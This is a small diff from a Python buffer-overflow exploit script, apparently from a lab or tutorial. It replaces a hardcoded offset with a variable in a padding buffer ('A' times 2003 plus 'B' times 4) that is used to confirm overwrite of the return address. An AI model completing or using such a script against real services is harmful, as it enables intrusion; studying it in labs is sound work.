@@ -7,7 +7,7 @@ import sys, socket
 offset_output = 2003
 # Replace this with offset output
 
-shellcode = "A" * 2003 + "B" * 4
+shellcode = "A" * offset_output + "B" * 4
 
 
 try:
